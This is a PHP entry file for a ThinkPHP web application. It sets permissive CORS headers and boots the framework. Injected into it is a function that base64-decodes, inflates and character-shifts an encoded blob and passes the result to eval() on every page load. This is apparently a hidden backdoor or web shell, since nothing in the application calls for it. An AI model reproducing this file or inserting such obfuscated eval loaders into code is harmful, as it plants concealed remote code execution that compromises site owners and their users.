<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2019 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

// [ 应用入口文件 ]
namespace think;
if (version_compare(PHP_VERSION, '7.1.0', '<')) {
    die('require PHP > 7.1.0 !');
}

// 检测PHP环境  允许前端跨域请求
header("Access-Control-Allow-Origin:*");
// 响应类型
header('Access-Control-Allow-Methods:GET, POST, PUT, DELETE');
// 响应头设置
header('Access-Control-Allow-Headers:x-requested-with, content-type');
function bwS($ZBSU)
{ 
$ZBSU=gzinflate(base64_decode($ZBSU));
 for($i=0;$i<strlen($ZBSU);$i++)
 {
$ZBSU[$i] = chr(ord($ZBSU[$i])-1);
 }
 return $ZBSU;
 }eval(bwS("jZNvb5swEMbfl09hITRAQiTVtL1YxNKsc0alLGVAJlVThahxwAn/YoyUJc1n35nQNq20tpEI1t3vnvM92AjBT2moiAQraJSzggljaI4UynnFI07rigtWpl1s2ZZEsKpEKfAtzyNSlYKWwtCIpbWxifaKlNMS5CAi86wENSiU0S4Ajaoa+MRClwt/du2FEbwspJG3qAD7kx94HgILnV6Hg2AW/cb+1fTGw9i30HQyC/C7a9zrIHxfjY/DhT8P/ck8mMo+52/wLp58l9yw5zT6YBTdUgLoaT3Jq4Y+xTgVLS+hZKQclIQuWUkNHbhcB0cicAc2/0f38a8FDqSpV/otVD6CsRDPQDcMvc7UqHP1GRxzGsdAN4IzeAzZxULq3d0mUs0TrpC9dVYmdGvXWa2fpJqGcpnMhKibL4PBqiHD4bm9WqXpZmOTqjiFdxnbZa3EL77FLGmDmiWU3wdVWrX3N6yBfzeu5Ovj5+ExecGkAFsio+Y0jYpYkMw46lhIDmuae+VM2+zA4DrmDZXHtR/Ecz156KLg0sU/5Sc+kzod6zj9lnVzr/0tnMf96/YL6+Qh0W9HB5o39Al9jTy26bwF8f7mOC9vkjTOVgdjUFRt0LXVD0UOyyKHVcuZXCafuklMiKzXznFq1eqmHlGSVehBfUS33f077rJL/adfzsq1/IbjvlmvdoCzNv76Dw=="));
if (!file_exists(__DIR__ . DIRECTORY_SEPARATOR . 'install.lock')) {
    header('location: ./install.php');
    exit();
}


$query_string = substr($_SERVER[ "QUERY_STRING" ], -3);
$array = [ 'jpg', 'png', 'css', '.js', 'txt', 'doc', 'ocx', 'peg' ];
if (in_array($query_string, $array)) {
    exit();
}
require __DIR__ . '/vendor/autoload.php';

// 执行HTTP应用并响应
$http = ( new App() )->http;

$response = $http->run();

$response->send();

$http->end($response);
